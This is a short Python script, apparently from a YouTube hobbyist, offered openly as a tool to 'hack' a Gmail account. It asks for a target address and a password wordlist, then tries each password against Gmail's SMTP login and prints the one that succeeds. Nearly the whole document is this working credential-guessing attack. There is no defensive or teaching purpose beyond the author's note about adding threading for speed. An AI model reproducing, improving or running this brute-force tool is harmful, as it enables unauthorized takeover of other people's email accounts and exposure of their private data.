"""
hello guy's my name is Ahmad Khalfan. i have youtube channel name 'AK 07 English'.

NOTE: this tools work when a gmail less secure options is enabled....

'i want to make it fast. I mean add threading, but the server not allowing me to login fast....''
i hope everyone understood what i say...
"""

import ssl
import smtplib

try:
	import colorama
	from colorama import Fore
except ModuleNotFoundError:
	print("module not found: install it with ' pip install colorama' or 'pip3 install colorama' or just like other python packages you install")

colorama.init(autoreset=True)

email = input(f"\n{Fore.LIGHTCYAN_EX}Enter Gmail address to hack: ")
wordlist = input(f"{Fore.LIGHTWHITE_EX}Enter wordlist path: ")

context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com",465, context=context) as server:
	with open(wordlist, 'r') as rf:
		for n, i in enumerate(rf.readlines()):
			password = i.strip()
			try:
				server.login(email, password)
				print(f"{Fore.BLUE}\n{n} {Fore.LIGHTMAGENTA_EX}Password found: email= {Fore.LIGHTRED_EX}{email}, {Fore.LIGHTMAGENTA_EX}password= {Fore.GREEN}{password}\n")
				break
			except smtplib.SMTPResponseException:
				print(f"{Fore.BLUE}{n} {Fore.RED}Password not found: {Fore.CYAN}{password}")

